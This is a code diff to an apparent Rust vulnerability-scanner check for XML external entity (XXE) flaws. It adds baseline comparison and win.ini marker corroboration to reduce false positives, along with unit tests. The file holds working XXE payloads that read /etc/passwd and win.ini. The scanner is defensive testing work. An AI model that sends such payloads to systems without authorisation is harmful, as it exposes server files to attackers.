@@ -12,10 +12,33 @@ use std::sync::LazyLock;
 
 pub const NAME: &str = "xxe";
 
-static PASSWD_RE: LazyLock<regex::Regex> = LazyLock::new(|| regex::Regex::new(r"root:.*:0:0:").unwrap());
+static PASSWD_RE: LazyLock<regex::Regex> =
+    LazyLock::new(|| regex::Regex::new(r"root:.*:0:0:").unwrap());
 
 const XXE_DOC: &str = "<?xml version=\"1.0\"?>\n<!DOCTYPE data [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<data>&xxe;</data>";
 const XXE_WIN: &str = "<?xml version=\"1.0\"?>\n<!DOCTYPE data [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]>\n<data>&xxe;</data>";
+const XXE_BASELINE: &str = "<?xml version=\"1.0\"?>\n<data></data>";
+
+const WININI_MARKERS: [&str; 4] = [
+    "[fonts]",
+    "[extensions]",
+    "[mci extensions]",
+    "; for 16-bit app support",
+];
+
+fn winini_markers(body: &str) -> Vec<&'static str> {
+    let lower = body.to_lowercase();
+    WININI_MARKERS
+        .iter()
+        .copied()
+        .filter(|m| lower.contains(m))
+        .collect()
+}
+
+fn winini_corroborated(body: &str) -> bool {
+    let n = winini_markers(body).len();
+    n >= 2 || (n == 1 && body.to_lowercase().contains("; 16-bit"))
+}
 
 pub fn run<'a>(client: &'a HttpClient, opts: &'a Opts) -> CheckFuture<'a> {
     Box::pin(run_impl(client, opts))
@@ -23,25 +46,52 @@ pub fn run<'a>(client: &'a HttpClient, opts: &'a Opts) -> CheckFuture<'a> {
 
 async fn run_impl(client: &HttpClient, _opts: &Opts) -> Vec<Finding> {
     let mut out = Vec::new();
+    let baseline = client
+        .request(
+            HttpRequest::post()
+                .raw_body(XXE_BASELINE.as_bytes().to_vec())
+                .header("Content-Type", "application/xml"),
+        )
+        .await
+        .ok();
 
     for (doc, label) in [(XXE_DOC, "file:///etc/passwd"), (XXE_WIN, "win.ini")] {
-        let req = HttpRequest::post().raw_body(doc.as_bytes().to_vec()).header("Content-Type", "application/xml");
-        let Ok(r) = client.request(req).await else { continue };
+        let req = HttpRequest::post()
+            .raw_body(doc.as_bytes().to_vec())
+            .header("Content-Type", "application/xml");
+        let Ok(r) = client.request(req).await else {
+            continue;
+        };
 
         if PASSWD_RE.is_match(&r.body) {
             out.push(
-                Finding::new(NAME, Severity::Critical, "XXE — external entity file read", format!("external entity {label} expanded into response"))
-                    .with_evidence("root:...:0:0:"),
+                Finding::new(
+                    NAME,
+                    Severity::Critical,
+                    "XXE — external entity file read",
+                    format!("external entity {label} expanded into response"),
+                )
+                .with_evidence("root:...:0:0:"),
             );
             return out;
         }
-        let lower = r.body.to_lowercase();
-        if lower.contains("[fonts]") || lower.contains("[extensions]") {
-            out.push(
-                Finding::new(NAME, Severity::Critical, "XXE — external entity file read (Windows)", format!("external entity {label} expanded into response"))
+        if winini_corroborated(&r.body) {
+            let echoed = baseline.as_ref().is_some_and(|b| {
+                let seen = winini_markers(&b.body);
+                winini_markers(&r.body).iter().all(|m| seen.contains(m))
+            });
+            if !echoed {
+                out.push(
+                    Finding::new(
+                        NAME,
+                        Severity::Critical,
+                        "XXE — external entity file read (Windows)",
+                        format!("external entity {label} expanded into response"),
+                    )
                     .with_evidence(r.body.chars().take(80).collect::<String>()),
-            );
-            return out;
+                );
+                return out;
+            }
         }
     }
     // If the endpoint rejects XML entirely we simply report nothing actionable.
@@ -55,7 +105,13 @@ mod tests {
     use pentest_core::HttpClientConfig;
 
     fn fast_client(base_url: String) -> HttpClient {
-        HttpClient::new(base_url, HttpClientConfig { delay: std::time::Duration::from_millis(0), ..HttpClientConfig::default() })
+        HttpClient::new(
+            base_url,
+            HttpClientConfig {
+                delay: std::time::Duration::from_millis(0),
+                ..HttpClientConfig::default()
+            },
+        )
     }
 
     #[tokio::test]
@@ -72,14 +128,16 @@ mod tests {
 
         let findings = run_impl(&client, &Opts::default()).await;
 
-        assert!(findings.iter().any(|f| f.title == "XXE — external entity file read"));
+        assert!(findings
+            .iter()
+            .any(|f| f.title == "XXE — external entity file read"));
     }
 
     #[tokio::test]
     async fn detects_windows_ini_entity_expansion() {
         let base = scripted_server(|req, _| {
             if req.body.contains("win.ini") {
-                ScriptedResponse::ok("<data>[fonts]\r\n</data>")
+                ScriptedResponse::ok("<data>[fonts]\r\n[extensions]\r\n</data>")
             } else {
                 ScriptedResponse::ok("<data></data>")
             }
@@ -89,7 +147,26 @@ mod tests {
 
         let findings = run_impl(&client, &Opts::default()).await;
 
-        assert!(findings.iter().any(|f| f.title == "XXE — external entity file read (Windows)"));
+        assert!(findings
+            .iter()
+            .any(|f| f.title == "XXE — external entity file read (Windows)"));
+    }
+
+    #[tokio::test]
+    async fn no_finding_for_a_single_win_ini_marker() {
+        let base = scripted_server(|req, _| {
+            if req.body.contains("win.ini") {
+                ScriptedResponse::ok("<data>[fonts]</data>")
+            } else {
+                ScriptedResponse::ok("<data></data>")
+            }
+        })
+        .await;
+        let client = fast_client(base);
+
+        let findings = run_impl(&client, &Opts::default()).await;
+
+        assert!(findings.is_empty());
     }
 
     #[tokio::test]
